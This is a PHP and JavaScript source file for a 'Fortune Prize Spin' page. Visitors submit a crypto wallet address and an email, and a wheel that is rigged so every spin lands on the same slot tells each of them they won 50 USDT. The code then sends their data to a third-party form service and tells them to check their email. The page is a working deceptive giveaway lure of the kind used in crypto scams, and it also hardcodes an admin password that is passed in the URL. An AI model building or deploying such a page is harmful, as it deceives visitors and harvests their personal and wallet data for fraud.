<?php
session_start();

// 1. Database Connection Configuration
$db_host = getenv('DB_HOST');
$db_name = getenv('DB_NAME');
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASS');
$db_port = getenv('DB_PORT') ?: '5432';

define('ADMIN_PASSWORD', 'tangente123'); // Change this!
try {
    // Connect to PostgreSQL
    $dsn = "pgsql:host=$db_host;port=$db_port;dbname=$db_name";
    $pdo = new PDO($dsn, $db_user, $db_pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);

    // --- AUTOMATIC TABLE CREATION FIX ---
    // This runs implicitly behind the scenes so you don't need a SQL console!
    $sql = "CREATE TABLE IF NOT EXISTS spin_locks (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        locked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );";
    $pdo->exec($sql);

} catch (PDOException $e) {
    // If database connection fails during setup, handle gracefully
    die("Database connection failed configuration. Details: " . $e->getMessage());
}

// 2. Handle Admin Reset Rule
if (isset($_GET['unlock']) && $_GET['unlock'] === 'true') {
    if (isset($_GET['password']) && $_GET['password'] === ADMIN_PASSWORD) {
        $_SESSION['has_spun'] = false;
        
        // Wipe all locks out of the database table
        $pdo->exec("TRUNCATE TABLE spin_locks");
        
        header("Location: index.php?status=reset_success");
        exit;
    } else {
        die("Unauthorized access.");
    }
}

// 3. Determine if the user is locked out via Session or Database check
$isLocked = false;
if (isset($_SESSION['has_spun']) && $_SESSION['has_spun'] === true) {
    $isLocked = true;
} else {
    // Fallback check: If session cleared but email exists in database
    // We check the last submitted email or track via a reference identifier
    if (isset($_SESSION['user_email'])) {
        $stmt = $pdo->prepare("SELECT id FROM spin_locks WHERE email = :email");
        $stmt->execute(['email' => $_SESSION['user_email']]);
        if ($stmt->fetch()) {
            $isLocked = true;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fortune Prize Spin </title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding-top: 50px;
        }

        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
            width: 350px;
        }

        h1 {
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }

        .wheel-container {
            position: relative;
            width: 250px;
            height: 250px;
            margin: 0 auto 30px;
        }

        #wheel {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 5px solid #333;
            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
        }

        .wheel-container::after {
            content: '';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 25px solid #e74c3c;
            z-index: 10;
        }

        .form-group {
            text-align: left;
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #555;
            font-size: 14px;
        }

        input[type="text"], input[type="email"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 5px rgba(52, 152, 219, 0.3);
        }

        button#spinBtn {
            background-color: #27ae60;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
            width: 100%;
            margin-top: 10px;
        }

        button#spinBtn:hover {
            background-color: #219150;
        }

        button#spinBtn:disabled {
            background-color: #bdc3c7;
            cursor: not-allowed;
        }

        #resultMessage {
            margin-top: 20px;
            font-weight: bold;
            font-size: 18px;
            min-height: 24px;
        }

        .footnote {
            font-size: 11px;
            color: #888;
            margin-top: 25px;
            text-transform: lowercase;
            letter-spacing: 0.5px;
        }

        .ad-banner {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            background-color: #fff;
            border-bottom: 1px solid #e1e8ed;
            padding: 10px 20px;
            text-align: center;
            color: #1da1f2;
            font-weight: 600;
            font-size: 13px;
            text-decoration: none;
            box-sizing: border-box;
            transition: background-color 0.2s, color 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .ad-banner:hover {
            background-color: #f5f8fa;
            color: #0d8ecf;
        }

        .ad-badge {
            background-color: #718096;
            color: white;
            font-size: 9px;
            padding: 2px 5px;
            border-radius: 3px;
            letter-spacing: 0.5px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<a href="https://www.pionex.com/en" target="_blank" class="ad-banner">
    <span class="ad-badge">AD</span>
    Try out our crypto exchange now →
</a>

<div class="container">
    <h1>Fortune Prize Spin</h1>

    <div class="wheel-container">
        <svg id="wheel" viewBox="0 0 100 100">
            <circle cx="50" cy="50" r="48" fill="#fff" stroke="#333" stroke-width="1"/>
        </svg>
    </div>

    <form id="spinForm">
        <div class="form-group">
            <label for="address">Address</label>
            <input type="text" id="address" name="address" placeholder="(only BTC,LTC,ETH,SOL)" required>
        </div>

        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="you@example.com" required>
        </div>

        <button type="submit" id="spinBtn" <?php echo $isLocked ? 'disabled' : ''; ?>>SPIN</button> 
    </form>

    <p id="resultMessage">
        <?php 
        if ($isLocked) {
            echo 'You have already used your spin. <br><span style="font-size: 13px; color: #666; font-weight: normal; display: block; margin-top: 5px;">check email for confirmation</span>';
        }
        ?>
    </p>

    <p class="footnote">game in beta. Spins subject to supply. </p>
</div>

<script>
    const WHEEL_VALUES = [0, 50, 10, 0, 10, 5, 0, 100, 0, 1000, 100,5];
    const ALLOWED_WIN_INDICES = [ 1]; 
    //const COLORS = ["#f1c40f", "#e67e22", "#e74c3c", "#9b59b6", "#3498db", "#1abc9c", "#3baea7", "#916ccd","#f77979","#ffec87","#b9fc84","#fa84fc"];
    const COLORS = [
    "#FF6B6B", "#FF8E53", "#FFAE42", "#FFD97D", 
    "#6BCCB4", "#4ECDC4", "#45AAF2", "#4B7BEC", 
    "#A55EEA", "#D6A2E8", "#F368E0", "#718093"];
    const wheelSvg = document.getElementById('wheel');
    const spinForm = document.getElementById('spinForm');
    const spinBtn = document.getElementById('spinBtn');
    const resultMessage = document.getElementById('resultMessage');

    const numSlots = WHEEL_VALUES.length;
    const degreesPerSlot = 360 / numSlots;

    for (let i = 0; i < numSlots; i++) {
        const startDeg = i * degreesPerSlot;
        const endDeg = (i + 1) * degreesPerSlot;
        
        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        const color = COLORS[i % COLORS.length];
        
        const largeArcFlag = degreesPerSlot > 180 ? 1 : 0;
        const startRad = (startDeg - 90) * Math.PI / 180;
        const endRad = (endDeg - 90) * Math.PI / 180;
        const x1 = 50 + 48 * Math.cos(startRad);
        const y1 = 50 + 48 * Math.sin(startRad);
        const x2 = 50 + 48 * Math.cos(endRad);
        const y2 = 50 + 48 * Math.sin(endRad);

        path.setAttribute("d", `M50,50 L${x1},${y1} A48,48 0 ${largeArcFlag},1 ${x2},${y2} Z`);
        path.setAttribute("fill", color);
        path.setAttribute("stroke", "#333");
        path.setAttribute("stroke-width", "0.5");
        wheelSvg.appendChild(path);

        const text = document.createElementNS("http://www.w3.org/2000/svg", "text");
        const textRad = (startDeg + degreesPerSlot / 2 - 90) * Math.PI / 180;
        const textX = 50 + 35 * Math.cos(textRad);
        const textY = 50 + 35 * Math.sin(textRad);

        text.setAttribute("x", textX);
        text.setAttribute("y", textY);
        text.setAttribute("fill", "#000");
        text.setAttribute("font-size", "5");
        text.setAttribute("font-weight", "bold");
        text.setAttribute("text-anchor", "middle");
        text.setAttribute("transform", `rotate(${startDeg + degreesPerSlot/2} ${textX} ${textY})`);
        text.textContent = WHEEL_VALUES[i];
        wheelSvg.appendChild(text);
    }

    let currentRotation = 0;

    if (spinForm) {
        spinForm.addEventListener('submit', function(event) {
    event.preventDefault();

    const emailValue = document.getElementById('email').value;
    spinBtn.disabled = true;

    // Call the server and securely pass the email context
    fetch('/lock.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: emailValue })
    })
    .then(response => response.json())
    .catch(err => console.error("Locking sync failed", err));

    resultMessage.textContent = "Spinning...";
    resultMessage.style.color = "#333";
    
    // ... rest of your spin animation math and Web3Forms triggers ...

            const randomAllowedIndex = ALLOWED_WIN_INDICES[Math.floor(Math.random() * ALLOWED_WIN_INDICES.length)];
            const winningValue = WHEEL_VALUES[randomAllowedIndex];

            const extraRots = Math.floor(Math.random() * 5) + 5; 
            const slotCenterDeg = (randomAllowedIndex * degreesPerSlot) + (degreesPerSlot / 2);
            const finalRotation = (extraRots * 360) - slotCenterDeg;
            
            currentRotation += finalRotation;
            wheelSvg.style.transform = `rotate(${currentRotation}deg)`;

            setTimeout(() => {
                resultMessage.textContent = `Your prize (equivalent in USDT) is: ${winningValue}`;
                resultMessage.style.color = winningValue > 0 ? "#27ae60" : "#e74c3c";

                // TRIGGER CONFETTI ANIMATION 🎉
            // (Only burst confetti if they won something higher than 0!)
            if (winningValue > 0) {
                confetti({
                    particleCount: 150, // Number of confetti pieces
                    spread: 80,         // How wide they shoot out
                    origin: { y: 0.6 }  // Shoots from just below the center of the screen
                });
            }

                resultMessage.innerHTML += `<br><span style="font-size: 13px; color: #666; font-weight: normal; display: block; margin-top: 5px;">check email for confirmation</span>`;

                const formData = {
                    address: document.getElementById('address').value,
                    email: document.getElementById('email').value,
                    prize: winningValue
                };

                sendResultEmail(formData);

            }, 4000);
        });
    }

    function sendResultEmail(data) {
        const formEndpoint = "https://api.web3forms.com/submit"; 

        const payload = {
            access_key: "485299c4-15d4-4294-a0f9-964b33b4f782", // Make sure your key is pasted here
            subject: "Fortune Wheel Spin Result (PoC)",
            from_name: "Wheel Game System",
            user_email: data.email,
            user_address: data.address,
            prize_won: data.prize
        };

        fetch(formEndpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload),
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                console.log("Email tracking successfully triggered via Web3Forms.");
            }
        })
        .catch((error) => {
            console.error('Fetch Error:', error);
        });
    }
</script>

</body>
</html>
